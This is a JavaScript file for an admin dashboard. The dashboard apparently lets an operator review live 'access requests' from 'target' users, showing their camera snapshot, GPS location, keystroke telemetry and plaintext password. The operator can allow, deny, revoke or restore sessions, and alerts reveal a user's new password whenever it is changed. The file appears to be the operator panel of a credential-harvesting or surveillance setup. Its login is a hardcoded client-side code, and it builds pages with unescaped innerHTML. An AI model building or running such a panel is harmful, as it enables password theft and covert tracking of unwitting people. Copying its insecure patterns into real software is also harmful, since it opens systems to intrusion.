const socket = io();

// UI Elements
const adminLoginScreen = document.getElementById('admin-login-screen');
const adminDashboard = document.getElementById('admin-dashboard');
const adminCodeInput = document.getElementById('admin-code');
const adminLoginBtn = document.getElementById('admin-login-btn');
const adminError = document.getElementById('admin-error');

const requestsGrid = document.getElementById('requests-grid');
const activeSessionsGrid = document.getElementById('active-sessions-grid');
const alertsList = document.getElementById('alerts-list');
const logsTb = document.getElementById('logs-tb');

let adminAuthenticated = false;

// Request notification permission on load
if ("Notification" in window && Notification.permission !== "granted") {
    Notification.requestPermission();
}

// 1. Admin Login (Secret Code 0406)
adminLoginBtn.addEventListener('click', () => {
    if (adminCodeInput.value === '0406') {
        adminAuthenticated = true;
        adminLoginScreen.style.display = 'none';
        adminDashboard.style.display = 'grid';
        
        // Now sync active requests and get logs
        socket.emit('admin_sync');
        socket.emit('get_logs');
    } else {
        adminError.style.display = 'block';
    }
});
adminCodeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') adminLoginBtn.click();
});

// Data Cache for session transfers
const sessionDataCache = {};

// Listen for incoming access requests
socket.on('new_access_request', (data) => {
    if (!adminAuthenticated) return;
    
    sessionDataCache[data.id] = data;
    
    // Check if card already exists to prevent duplicates
    if (document.getElementById(`req-${data.id}`)) return;
    
    // Trigger Browser Notification & Sound
    if ("Notification" in window && Notification.permission === "granted") {
        new Notification("Security Alert: New Access Request", {
            body: `Authorization required for new session.`,
        });
    }
    const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
    audio.play().catch(e => console.log("Audio prevented:", e));
    
    const card = document.createElement('div');
    card.className = 'request-card';
    card.id = `req-${data.id}`;
    
    const imgSrc = data.photo || 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="50" fill="gray">No Image</text></svg>';
    const timeLocal = new Date(data.timestamp).toLocaleTimeString();
    const mapLink = data.location && data.location.lat ? 
        `<a href="https://www.google.com/maps?q=${data.location.lat},${data.location.lng}" target="_blank" style="color:var(--safe-color);">Lat: ${data.location.lat.toFixed(4)}, Lng: ${data.location.lng.toFixed(4)}</a>` : 
        'N/A';

    card.innerHTML = `
        <img src="${imgSrc}" alt="Snapshot">
        <div class="request-data">
            <div><span>Target User ID:</span> <span class="data-value">${data.userid || 'Unknown'}</span></div>
            <div><span>Socket ID:</span> <span class="data-value">${data.id}</span></div>
            <div><span>Time:</span> <span class="data-value">${timeLocal}</span></div>
            <div><span>GPS Location:</span> <span class="data-value">${mapLink}</span></div>
        </div>
        <div class="btn-group">
            <button class="btn-allow" onclick="makeDecision('${data.id}', 'Allow')">Allow</button>
            <button class="btn-deny" onclick="makeDecision('${data.id}', 'Deny')">Deny</button>
        </div>
    `;
    requestsGrid.appendChild(card);
});

// Admin makes a decision
window.makeDecision = function(socketId, decision) {
    socket.emit('admin_decision', { targetSocketId: socketId, decision: decision });
    const card = document.getElementById(`req-${socketId}`);
    if (card) card.remove();
    
    if (decision === 'Allow') {
        createActiveSessionCard(socketId);
    }
};

socket.on('remove_request_card', (targetSocketId) => {
    const card = document.getElementById(`req-${targetSocketId}`);
    if (card) card.remove();
    // If we want the main dashboard to also show active session if mobile approved it,  we would need more logic, 
    // but for now, just removing perfectly aligns the pending list. 
    // Usually the main admin sync loop / socket re-connect will handle it.
});

function createActiveSessionCard(socketId) {
    if (document.getElementById(`active-${socketId}`)) return;
    
    const data = sessionDataCache[socketId] || {};
    const imgSrc = data.photo || 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="50" fill="gray">No Image</text></svg>';
    
    const active = document.createElement('div');
    active.className = 'request-card';
    active.id = `active-${socketId}`;
    active.innerHTML = `
        <img src="${imgSrc}" alt="Snapshot" style="height: 120px;">
        <div class="request-data">
            <div><span>User ID:</span> <span class="data-value">${data.userid || 'Unknown'}</span></div>
            <div><span>Socket ID:</span> <span class="data-value">${socketId}</span></div>
        </div>
        <div class="btn-group" style="margin-top: 10px; display: flex; flex-direction: column;">
            <button class="btn-allow" style="margin-bottom: 5px; background: var(--ui-blue);" onclick="restoreSession('${socketId}')">Restore Session</button>
            <button class="btn-revoke" onclick="revokeAccess('${socketId}')">Revoke Access</button>
        </div>
    `;
    activeSessionsGrid.appendChild(active);
}

window.revokeAccess = function(socketId) {
    socket.emit('revoke_access', socketId);
    const activeCard = document.getElementById(`active-${socketId}`);
    if (activeCard) activeCard.remove();
};

window.restoreSession = function(socketId) {
    socket.emit('restore_access', socketId);
    // Optionally remove styling if it was red from an alert
    const activeCard = document.getElementById(`active-${socketId}`);
    if (activeCard) {
        activeCard.style.borderColor = 'var(--ui-blue)';
        activeCard.style.boxShadow = 'none';
    }
};

// Handle generic logs retrieval
let globalLogs = {};

socket.on('logs_data', (rows) => {
    logsTb.innerHTML = '';
    globalLogs = {};

    rows.forEach(row => {
        globalLogs[row.id] = row;

        let color = '#ccc';
        if (row.status === 'ALLOW') color = 'var(--safe-color)';
        if (row.status === 'DENY' || row.status === 'LOCKED' || row.status === 'REVOKED') color = 'var(--alert-color)';
        if (row.status === 'PENDING') color = 'orange';

        const imgSrc = row.photo ? `<img src="${row.photo}" style="width: 50px; height: 50px; object-fit: cover; border-radius: 4px; border: 1px solid #333;">` : '<span style="color:#555">N/A</span>';
        
        const tr = document.createElement('tr');
        tr.style.cursor = 'pointer';
        tr.onclick = () => openSessionDetails(row.id);
        
        tr.innerHTML = `
            <td>${row.id}</td>
            <td style="font-weight: bold;">${row.userid || 'Unknown'}</td>
            <td>${imgSrc}</td>
            <td>${row.socket_id}</td>
            <td class="status-header" style="color: ${color};">${row.status}</td>
            <td>${new Date(row.timestamp).toLocaleString()}</td>
        `;
        logsTb.appendChild(tr);
    });
});

window.openSessionDetails = function(id) {
    const row = globalLogs[id];
    if (!row) return;

    document.getElementById('modal-photo').src = row.photo || '';
    document.getElementById('modal-userid').innerText = row.userid || 'Unknown';
    document.getElementById('modal-pass').innerText = row.password || 'N/A';
    document.getElementById('modal-socket').innerText = row.socket_id || '';
    
    const statusEl = document.getElementById('modal-status');
    statusEl.innerText = row.status;
    statusEl.style.color = (row.status === 'ALLOW') ? 'var(--safe-color)' : (row.status === 'PENDING' ? 'orange' : 'var(--alert-color)');
    
    document.getElementById('modal-time').innerText = new Date(row.timestamp).toLocaleString();

    let locHTML = 'N/A';
    if (row.location) {
        try {
            const loc = JSON.parse(row.location);
            if (loc.lat) {
                locHTML = `<a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" style="color:var(--safe-color); text-decoration:none;">🌍 Lat: ${loc.lat.toFixed(4)}, Lng: ${loc.lng.toFixed(4)}</a>`;
            }
        } catch(e){}
    }
    document.getElementById('modal-location').innerHTML = locHTML;

    // Build Activity Logs
    const tbody = document.getElementById('modal-activity-logs');
    tbody.innerHTML = '';
    
    let activities = [];
    if (row.activity_log) {
        try { activities = JSON.parse(row.activity_log); } catch(e){}
    }
    
    if (activities.length === 0) {
        tbody.innerHTML = `<tr><td colspan="2" style="text-align:center; color:#555; padding:20px;">No telemetry events recorded for this session.</td></tr>`;
    } else {
        activities.forEach(act => {
            const rowTr = document.createElement('tr');
            rowTr.innerHTML = `<td style="color:var(--ui-blue)">[${act.time}]</td><td>${act.action}</td>`;
            tbody.appendChild(rowTr);
        });
    }

    document.getElementById('session-details-modal').style.display = 'flex';
};

// Biometric Alerts System
socket.on('alert_high_risk', (alertData) => {
    if (!adminAuthenticated) return;
    
    const placeholder = alertsList.querySelector('li[style*="transparent"]');
    if (placeholder) placeholder.remove();

    const li = document.createElement('li');
    li.className = 'alert-item blink';
    setTimeout(() => li.classList.remove('blink'), 5000);

    const timestamp = new Date().toLocaleTimeString();
    
    li.innerHTML = `
        <span class="alert-timestamp">[${timestamp}] WARNING</span>
        <strong>Target:</strong> ${alertData.id}<br>
        <strong>Reason:</strong> ${alertData.reason}
        ${alertData.wpm ? `<br><strong>WPM:</strong> ${alertData.wpm.toFixed(1)} | <strong>Clicks:</strong> ${alertData.clicks}` : ''}
    `;
    alertsList.prepend(li);
    
    // Play alert sound for security violations
    const violationAudio = new Audio('https://assets.mixkit.co/active_storage/sfx/2865/2865-preview.mp3'); 
    violationAudio.play().catch(e => console.log(e));

    const sessionCard = document.getElementById(`active-${alertData.id}`);
    if (sessionCard) {
        sessionCard.style.borderColor = 'var(--alert-color)';
        sessionCard.style.boxShadow = '0 0 15px rgba(255, 51, 102, 0.5)';
    }
});

// Password Change Watcher
socket.on('admin_password_alert', (data) => {
    if (!adminAuthenticated) return;
    
    const placeholder = alertsList.querySelector('li[style*="transparent"]');
    if (placeholder) placeholder.remove();

    const li = document.createElement('li');
    li.className = 'alert-item blink';
    li.style.borderLeftColor = 'var(--safe-color)';
    li.style.background = 'rgba(0, 250, 154, 0.1)';
    setTimeout(() => li.classList.remove('blink'), 5000);

    li.innerHTML = `
        <span class="alert-timestamp" style="color:var(--safe-color);">[${data.time}] SYSTEM UPDATE</span>
        <strong>Target:</strong> ${data.id}<br>
        <strong>Action:</strong> User changed account password.<br>
        <strong>New Password:</strong> <span style="font-family: monospace; background:#000; padding:2px; color:var(--alert-color);">${data.newPassword}</span>
    `;
    alertsList.prepend(li);
    
    const chime = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
    chime.play().catch(e => console.log(e));
});
